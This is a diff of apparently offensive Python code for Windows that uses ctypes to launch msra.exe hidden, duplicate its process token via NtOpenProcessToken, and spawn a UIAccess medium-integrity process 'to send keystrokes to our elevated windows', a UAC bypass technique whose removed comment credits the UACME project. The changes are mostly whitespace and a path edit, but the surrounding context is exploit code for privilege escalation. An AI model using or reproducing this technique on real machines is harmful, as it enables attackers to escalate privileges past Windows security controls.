@@ -22,17 +22,17 @@ class TOKEN_INFORMATION_CLASS(c_enum):
 
 class IntegrityLevel(object):
 	HIGH_RID	= 0x00003000
-	MEDIUM_RID	= 0x00002000
+	MEDIUM_RID 	= 0x00002000
 	MEDIUM_PLUS_RID = MEDIUM_RID + 0x100
 
 class GroupAttributes(object):
 	SE_GROUP_ENABLED	= 0x00000004
-	SE_GROUP_INTEGRITY	= 0x00000020         
-	SE_GROUP_LOGON_ID	= 0xC0000000 
-	SE_GROUP_MANDATORY	= 0x00000001 
-	SE_GROUP_OWNER		= 0x00000008   
-	SE_GROUP_RESOURCE	= 0x20000000 
-	SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010 
+	SE_GROUP_INTEGRITY	= 0x00000020
+	SE_GROUP_LOGON_ID	= 0xC0000000
+	SE_GROUP_MANDATORY	= 0x00000001
+	SE_GROUP_OWNER		= 0x00000008
+	SE_GROUP_RESOURCE	= 0x20000000
+	SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010
 	SE_GROUP_INTEGRITY_ENABLED  = 0x00000040
 	SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002
 
@@ -110,7 +110,7 @@ def main():
 		shinfo = ShellExecInfo()
 		shinfo.cbSize = ctypes.sizeof(shinfo)
 		shinfo.fMask = 0x00000040
-		shinfo.lpFile = "c:\\windows\\system32\\msra.exe"
+		shinfo.lpFile = "msra.exe"
 		shinfo.nShow = 0
 		shinfo.lpParameters = None
 
@@ -127,7 +127,7 @@ def main():
 		# 
 		token = ctypes.c_void_p(ctypes.c_void_p(-1).value)
 		if ctypes.windll.ntdll.NtOpenProcessToken(shinfo.hProcess, (TOKEN_DUPLICATE | TOKEN_QUERY),
-							ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
+								ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
 			print "[-] Unable to open process token using NtOpenProcessToken"
 			return False
 		else:
@@ -181,7 +181,6 @@ def main():
 		#
 		# Spawn a new process with UIAccess flag and Medium Integrity
 		# We use this process to send keystrokes to our elevated windows
-		# https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
 		#
 		lpStartupInfo = STARTUPINFO()
 		lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
